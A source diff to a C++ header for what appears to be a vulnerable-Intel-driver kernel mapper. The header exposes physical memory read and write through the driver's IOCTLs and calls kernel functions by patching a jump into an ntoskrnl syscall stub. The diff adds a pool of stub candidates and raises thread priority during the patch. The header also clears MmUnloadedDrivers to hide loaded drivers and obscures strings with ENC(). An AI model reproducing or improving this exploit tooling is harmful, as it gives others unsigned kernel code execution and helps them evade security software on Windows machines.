@@ -1,6 +1,7 @@
 #pragma once
 #include <Windows.h>
 #include <string>
+#include <vector>
 
 #include "utils.hpp"
 #include "nt.hpp"
@@ -20,6 +21,11 @@ namespace intel_driver
 	constexpr ULONG32 IOCTL_PHYS_WRITE_WORD_BULK  = 0x9C412428;
 	constexpr ULONG32 IOCTL_PHYS_WRITE_BYTE_BULK  = 0x9C41242C;
 
+	struct StubEntry {
+		uint64_t kaddr;
+		std::string name;
+	};
+
 	extern HANDLE hDevice;
 	extern ULONG64 ntoskrnlAddr;
 	extern ULONG64 ntoskrnlPhysBase;
@@ -27,6 +33,15 @@ namespace intel_driver
 	extern bool runtimeReady;
 	extern ULONG32 loadedDriverTimestamp;
 	extern std::wstring vulnerableDriverPath;
+	extern std::wstring loadedSymlinkName;
+	extern std::vector<uint8_t> cachedNtoskrnlText;
+	extern uint64_t cachedNtoskrnlTextBase;
+	extern uint32_t cachedNtoskrnlTextSize;
+	extern bool g_stubPoolReady;
+	extern std::vector<StubEntry> g_stubPool;
+
+	HANDLE OpenDeviceHandle();
+	void CloseDeviceHandle();
 
 	bool PhysicalRead(uint64_t physical_address, void* buffer, uint64_t size);
 	bool PhysicalWrite(uint64_t physical_address, const void* buffer, uint64_t size);
@@ -66,6 +81,10 @@ namespace intel_driver
 	bool ClearMmUnloadedDrivers();
 	std::wstring GetDriverNameW();
 	std::wstring GetDriverPath();
+	std::wstring GetSymlinkName();
+
+	bool PopulateStubPool();
+	bool PickStub(uint64_t& out_kaddr, std::string& out_name);
 
 	template<typename T, typename ...A>
 	bool CallKernelFunction(T* out_result, uint64_t kernel_function_address, const A ...arguments) {
@@ -88,44 +107,15 @@ namespace intel_driver
 		if (ntdll == 0)
 			return false;
 
-		static uint64_t kernel_stub = 0;
-		static std::string found_stub_name;
+		if (!PopulateStubPool())
+			return false;
 
-		if (!kernel_stub) {
-			std::string candidates[] = {
-				ENC("NtTraceControl"),
-				ENC("NtQueryDebugFilterState"),
-				ENC("NtSetDebugFilterState"),
-				ENC("NtFlushBuffersFileEx"),
-				ENC("NtAccessCheckByTypeAndAuditAlarm"),
-				ENC("NtAddAtom"),
-			};
+		uint64_t kernel_stub = 0;
+		std::string stub_name;
+		if (!PickStub(kernel_stub, stub_name))
+			return false;
 
-			for (int i = 0; i < _countof(candidates); i++) {
-				uint64_t addr = GetKernelModuleExport(intel_driver::ntoskrnlAddr, candidates[i]);
-				if (addr) {
-					uint8_t probe[16];
-					if (ReadMemory(addr, probe, sizeof(probe))) {
-						bool clean = true;
-						if (probe[0] == 0x48 && probe[1] == 0xb8 && probe[10] == 0xff && probe[11] == 0xe0)
-							clean = false;
-						if (probe[0] == 0xe9 || probe[0] == 0xeb)
-							clean = false;
-
-						if (clean) {
-							kernel_stub = addr;
-							found_stub_name = candidates[i];
-							break;
-						}
-					}
-				}
-			}
-
-			if (!kernel_stub)
-				return false;
-		}
-
-		const auto UserStub = reinterpret_cast<void*>(GetProcAddress(ntdll, found_stub_name.c_str()));
+		const auto UserStub = reinterpret_cast<void*>(GetProcAddress(ntdll, stub_name.c_str()));
 		if (!UserStub)
 			return false;
 
@@ -140,8 +130,14 @@ namespace intel_driver
 			original_kernel_function[10] == 0xff && original_kernel_function[11] == 0xe0)
 			return false;
 
-		if (!WriteToReadOnlyMemory(kernel_stub, &kernel_injected_jmp, sizeof(kernel_injected_jmp)))
+		HANDLE curThread = GetCurrentThread();
+		int oldPrio = GetThreadPriority(curThread);
+		SetThreadPriority(curThread, THREAD_PRIORITY_TIME_CRITICAL);
+
+		if (!WriteToReadOnlyMemory(kernel_stub, &kernel_injected_jmp, sizeof(kernel_injected_jmp))) {
+			SetThreadPriority(curThread, oldPrio);
 			return false;
+		}
 
 		if constexpr (!call_void) {
 			using FunctionFn = T(__stdcall*)(A...);
@@ -154,6 +150,8 @@ namespace intel_driver
 			Function(arguments...);
 		}
 
-		return WriteToReadOnlyMemory(kernel_stub, original_kernel_function, sizeof(kernel_injected_jmp));
+		bool ok = WriteToReadOnlyMemory(kernel_stub, original_kernel_function, sizeof(kernel_injected_jmp));
+		SetThreadPriority(curThread, oldPrio);
+		return ok;
 	}
 }
